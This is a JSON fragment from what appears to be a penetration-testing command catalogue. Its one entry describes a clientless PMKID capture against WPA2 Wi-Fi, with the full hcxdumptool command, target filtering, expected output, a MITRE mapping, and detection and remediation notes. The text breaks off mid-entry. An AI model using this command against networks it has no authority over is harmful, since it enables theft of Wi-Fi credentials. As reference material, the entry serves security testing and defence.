    "category": "wireless",
    "phase": 4,
    "os": [
      "linux"
    ],
    "command": "hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1 --filterlist_ap=<bssid> --filtermode=2",
    "name": "PMKID Capture (Clientless WPA Attack)",
    "description": "Captures PMKID from AP without needing a connected client \u2014 faster than handshake capture.",
    "arguments": {
      "--enable_status=1": "Show status",
      "-o": "Output file",
      "--filterlist_ap": "Target BSSID"
    },
    "expected_output": "[FOUND PMKID] BSSID: AA:BB:CC:DD:EE:FF",
    "use_case": "Attack WPA2 networks without waiting for client handshake \u2014 works on most modern APs.",
    "prerequisites": [
      "Monitor mode adapter",
      "hcxdumptool installed"
    ],
    "mitre_mapping": [
      "T1040"
    ],
    "mitre_tactic": "Credential Access",
    "detections": [
      "Monitor mode activity",
      "Unusual management frames"
    ],
    "remediation": [
      "Use WPA3",
      "Disable PMKID in AP firmware"
    ],
    "common_mistakes": [
